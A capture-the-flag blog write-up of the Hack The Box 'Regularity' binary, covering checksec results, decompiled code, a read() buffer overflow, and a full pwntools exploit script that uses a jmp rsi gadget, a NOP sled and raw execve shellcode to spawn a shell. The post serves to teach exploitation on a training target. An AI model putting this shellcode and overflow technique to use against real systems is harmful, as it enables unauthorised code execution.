---
title: Binary Exploitation Writeup - Regularity
published: true
date: 2025-02-25 00:00:00 +/-0000
categories: [general,ctf]
tags: [ctf,htb,binexp,binary exploitation,reverse engineering]     # TAG names should always be lowercase
image:
    path: /assets/images/malware.jpg
---

This ended up being a good introductory exercise to injecting shellcode. Rated "Very Easy" by Hack The Box, this `pwn` binary, this challenge took only a few minutes to exploit having got back into the swing of things.

This challenge is shipped without any source code, so we're meant to both reverse engineer the binary and develop an exploit for it. Running `checksec` shows the binary is pretty much unprotected:

| Check Performed | Impact |
|--|--|
| <span style="color:red">No RELRO</span>| Allows us to target the GOT, if need be. |
| <span style="color:red">No Canary Found</span>| Permits us to overflow RET addresses, if need be. |
| <span style="color:red">NX disabled</span>| Allows us to run shellcode within the stack, if need be. |
| <span style="color:red">No PIE</span>| Binary addresses aren't randomized at runtime, making it easier to perform targeted jumps. |

Decompiling the binary shows no symbols reflecting a `main()` function, so we'll default to `entry()` instead:

```c
void processEntry entry(void)

{
  size_t __nbytes;
  undefined *__buf;
  int __fd;
  
  __fd = 1;
  __buf = &message1;
  write(1,&message1,0x2a);
  read(__fd,__buf,__nbytes);
  write(1,&message3,0x27);
  syscall();
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}
```

Under normative circumstances, this would print out `message1` (*"Hello, Survivor. Anything new these days?"*), the user would submit some input, and then print out `message2` (*"Yup, same old same old here as well..."*). The program would then exit out.

## Vulnerability

The vulnerability rests with the `read()` call, allowing for more bytes to be written into `buf` than what the string permits. Examining the underlying instructions affirms this in showing:

```assembly
mov edi, 0x1
mov rsi, message1
mov edx, 0x2a
call write
call read
```

Exploitation is pretty straightforward:

1. Determine the offset necessary to overflow the `ret` instruction using `cyclic()`
    1. This can be down first by constructing/submitting a payload like `cyclic(500)`
    2. After submitting, we can observe the overflow in `GDB` and calculate the offset using `cyclic_find()`
2. Identify an appropriate point to control/jump to
    1. At the point of overflowing, I'm interested in seeing if any of the registers are pointing to areas of the stack we overflow.
    2. In our case, this happens in `RSI`
3. Find a gadget that allows us to jump to that point.
    1. Using `ropper` and `objdump`, we can look for any `jmp` or `call` instructions to `RSI`.
    2. In our case, we can find a `jmp rsi` gadget at `0x401041`
4. Overflow that point with a NOPsled + shellcode
    1. A NOPsled is a consecutive series of `\x90` operations - in x86 Assembly, that's "no operation", letting the CPU spin cycles.
    2. One uses a NOPsled to mitigate small variances in the stack size at runtime. If the binary can't reliably jump directly to shellcode, it can land in a slew of `\x90` instructions *leading* to the shellcode.
    3. This *particular* binary actually doesn't have such variances in the stack, but we'll go through the motions all the same.

And here's our exploit code:

```python
#!/usr/bin/env python3
import sys

from pwn import *

context.update(arch='amd64', os='linux')


binstr = "./regularity"
address_port_str = "83.136.255.180:49349"
ip, port_str = address_port_str.split(":")
port = int(port_str)

#    break *0x56555d36
if (len(sys.argv)<= 1):
    p = process(binstr)
elif (sys.argv[1] == "dbg"):
    p = gdb.debug([binstr],'''
    unset env LINES
    unset env COLUMNS
    break *0x401000
    continue
    ''')
elif (sys.argv[1] == "remote"):
    p = remote(ip,port)
else:
    print(f"Invalid argument to e.py: '{sys.argv[1]}'. Did you mean 'dbg'?")
    sys.exit(1)

offset = cyclic_find(0x636161706361616f)
print("The offset is ", offset)
jmprsi = p64(0x401041)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = 50 * b'\x90'
payload += shellcode
payload += cyclic(offset - len(payload))
payload += jmprsi

p.sendline(payload)

p.interactive()
```

# Learning Outcomes

* This was a nice follow-up to [El Teteo earlier in the month]( {% post_url 2025/2025-02-08-binexp-elteteo %} ); building off of that exercise we actually need to do a *little* bit of exploiting (vs. merely supplying the shellcode directly).